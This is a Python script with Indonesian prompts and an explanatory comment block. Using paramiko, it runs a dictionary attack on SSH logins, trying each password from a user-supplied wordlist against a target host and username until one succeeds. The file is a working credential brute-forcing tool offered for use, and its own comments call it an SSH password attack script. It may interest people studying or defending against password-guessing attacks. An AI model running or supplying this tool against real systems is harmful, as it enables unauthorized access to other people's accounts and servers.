import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('[+] Alamat TArget: ')
username = input('[+] Nama penggunak SSH: ')
input_file = input('[+] FIle Kata sandi: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] File/Path Itu tidak ada')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Ditemukan Pasword: ' + password + ' , Untuk Akun: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Login Salah: ' + password)
            elif response == 2:
                print('[!!] Tidak dapat terhubung')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass

# ====================================================================================
# Dalam kode yang diberikan, ada beberapa hal yang perlu diperhatikan:

# 1. **Fungsi `ssh_connect(password, code=0)`**:
#    - Fungsi ini bertanggung jawab untuk membuat koneksi SSH menggunakan modul `paramiko`.
#    - Jika koneksi berhasil, maka kode yang dikembalikan adalah 0.
#    - Jika autentikasi gagal, maka kode yang dikembalikan adalah 1.
#    - Jika terjadi kesalahan soket, maka kode yang dikembalikan adalah 2.
#    - Metode `close()` dipanggil untuk menutup koneksi SSH setelah pengujian.

# 2. **Input dari Pengguna**:
#    - Pengguna diminta untuk memasukkan alamat tujuan, nama pengguna SSH, dan file yang berisi daftar kata sandi yang akan diuji.

# 3. **Pemeriksaan Keberadaan File**:
#    - Kode memeriksa apakah file yang diberikan oleh pengguna ada atau tidak. Jika tidak, maka program keluar dengan pesan kesalahan yang sesuai.

# 4. **Iterasi Melalui Daftar Kata Sandi**:
#    - Setelah file berhasil dibuka, kode membaca setiap baris (kata sandi) dan mencoba untuk melakukan koneksi SSH dengan kata sandi tersebut.
#    - Jika autentikasi berhasil, kata sandi yang ditemukan dicetak dengan warna hijau.
#    - Jika autentikasi gagal, kata sandi yang sedang diuji dicetak sebagai tidak benar.
#    - Jika terjadi kesalahan soket, pesan kesalahan dicetak dan program keluar.

# Kode ini merupakan skrip sederhana untuk melakukan serangan kata sandi SSH menggunakan daftar kata sandi yang diberikan oleh pengguna. Itu berulang kali mencoba setiap kata sandi dari daftar hingga menemukan yang berhasil atau mencapai akhir daftar.
